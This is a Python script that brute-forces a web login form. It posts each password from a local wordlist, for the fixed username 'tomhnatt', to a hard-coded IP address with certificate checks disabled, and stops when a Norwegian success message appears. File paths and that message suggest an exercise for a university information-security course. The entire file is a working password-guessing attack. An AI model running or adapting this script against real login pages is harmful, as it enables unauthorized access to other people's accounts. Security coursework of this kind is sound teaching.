import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
login_url = "http://158.39.188.211/index.php?page=kit10"
username = "tomhnatt"
password_file_path = "/Users/stefan/Documents/Dev/Informatikk_HIOF/Datasikkerhet/password_combinations.txt"
success_indicator = "Svaret på oppgaven er"  # Norwegian for "The answer to the task is"

# Function to attempt login with a given password
def attempt_login(password):
    data = {
        'username': username,
        'password': password,
        # Add any other necessary form parameters here
    }
    # Note: If there is CSRF or any other token you need to handle, you'll need to modify the script to handle it
    response = requests.post(login_url, data=data, verify=False)
    # Added verify=False to ignore SSL certificate verification
    if success_indicator in response.text:
        print(f"Success! Password is: {password}")
        return True
    return False

# Main logic
counter = 0
found = False
with open(password_file_path, 'r') as file:
    for line in file:
        password = line.strip()  # Remove any trailing whitespace/newline
        counter += 1
        if counter % 100 == 0:  # Print a message every 100 attempts
            print(f"Attempted {counter} passwords...")
        if attempt_login(password):
            found = True
            break

if not found:
    print("Completed all attempts. No solution found.")
